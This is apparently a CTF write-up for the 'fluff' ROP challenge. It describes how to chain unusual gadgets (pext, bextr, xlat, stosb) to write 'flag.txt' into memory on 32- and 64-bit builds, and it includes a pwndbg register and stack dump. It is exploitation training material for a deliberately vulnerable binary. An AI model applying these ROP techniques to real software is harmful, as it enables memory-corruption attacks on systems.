# Fluff

Objective:

Basically same as write4 but you have to use unusual gadgets

Security:

|RELRO|STACK CANARY|NX|PIE|RPATH|RUNPATH|Symbols|FORTIFY|Fortified|Fortifiable|FILE|ASLR|
|-|-|-|-|-|-|-|-|-|-|-|-|
|Partial RELRO|No canary found|NX enabled|No PIE|No RPATH|No RUNPATH|72) Symbols|No|0|3|ret2win32|ASLR Disabled|

### 32 Bit Analysis

- Methodology: We need to make use of the pext gadget which makes use of a mask and the value 0xb0bababa and extract continguous bits to detination register. More details is in the source code. We control the mask in ebp register which we will need to configure such that in our destination register edx. We then use the pop ecx gadget and the bswap ecx gadget to populate the ecx register with the data section which we want to write to before we use the xchg gadget to swap 8 bits from the ecx register to edx register.

### 64 Bit Analysis

- Methodology: We need to make use of the bextr gadget which will take rcx[rdx[0:8]:rdx[0:8]+rdx[8:16]] and store it into rbx. You can control rcx and rdx. Can just set rdx to any 0xXX00 for simplicity, where we will just look at the 0th bit and take the first XX number of bits from the 0th bit of rcx. For rcx, we need to obtain the value of each character of "flag.txt" - the current value of rax - 0x3ef2 as we will be adding rcx with 0x3ef2 and in our next gadget xlat, we will be ADDING the current value of rdx to al which are the lowest 8 bits of the rax register. After which we will use the stosb gadget to swap 1 byte from rax to rdi.

- Breakpoint at `stosb` gadget

    ```
    pwndbg> c
    Continuing.
    
    Breakpoint 3, 0x0000000000400639 in questionableGadgets ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ───────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────
    *RAX  0x66
    *RBX  0x4003b9 ◂— add    byte ptr [rax], al
    *RCX  0x4003b9 ◂— add    byte ptr [rax], al
    *RDX  0x2000
    *RDI  0x601028 (data_start) ◂— 0x0
     RSI  0x7ffff7da1743 (_IO_2_1_stdout_+131) ◂— 0xda3670000000000a /* '\n' */
     R8   0xb
     R9   0x7ffff7fdc1f0 (_dl_fini) ◂— push   rbp
     R10  0x7ffff7feda30 (strcmp+4784) ◂— pxor   xmm0, xmm0
     R11  0x246
     R12  0x400520 (_start) ◂— xor    ebp, ebp
     R13  0x0
     R14  0x0
     R15  0x0
     RBP  0x9090909090909090
    *RSP  0x7fffffffdc30 —▸ 0x40062a (questionableGadgets+2) ◂— pop    rdx
    *RIP  0x400639 (questionableGadgets+17) ◂— stosb  byte ptr [rdi], al
    ────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────
       0x40062a <questionableGadgets+2>     pop    rdx
       0x40062b <questionableGadgets+3>     pop    rcx
       0x40062c <questionableGadgets+4>     add    rcx, 0x3ef2
       0x400633 <questionableGadgets+11>    bextr  rbx, rcx, rdx
       0x400638 <questionableGadgets+16>    ret    
     
     ► 0x400639 <questionableGadgets+17>    stosb  byte ptr [rdi], al            <data_start>
       0x40063a <questionableGadgets+18>    ret    
        ↓
       0x40062a <questionableGadgets+2>     pop    rdx
       0x40062b <questionableGadgets+3>     pop    rcx
       0x40062c <questionableGadgets+4>     add    rcx, 0x3ef2
       0x400633 <questionableGadgets+11>    bextr  rbx, rcx, rdx
    ─────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────
    00:0000│ rsp 0x7fffffffdc30 —▸ 0x40062a (questionableGadgets+2) ◂— pop    rdx
    01:0008│     0x7fffffffdc38 ◂— 0x2000
    02:0010│     0x7fffffffdc40 ◂— 0x3fc2e1
    03:0018│     0x7fffffffdc48 —▸ 0x400628 (questionableGadgets) ◂— xlatb  
    04:0020│     0x7fffffffdc50 —▸ 0x4006a3 (__libc_csu_init+99) ◂— pop    rdi
    05:0028│     0x7fffffffdc58 —▸ 0x601029 (data_start+1) ◂— 0x0
    06:0030│     0x7fffffffdc60 —▸ 0x400639 (questionableGadgets+17) ◂— stosb  byte ptr [rdi], al
    07:0038│     0x7fffffffdc68 —▸ 0x40062a (questionableGadgets+2) ◂— pop    rdx
    ───────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────
     ► f 0         0x400639 questionableGadgets+17
       f 1         0x40062a questionableGadgets+2
       f 2           0x2000
       f 3         0x3fc2e1
       f 4         0x400628 questionableGadgets
       f 5         0x4006a3 __libc_csu_init+99
       f 6         0x400639 questionableGadgets+17
       f 7         0x40062a questionableGadgets+2
    ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    pwndbg> x $rax
    0x66:	Cannot access memory at address 0x66
    ```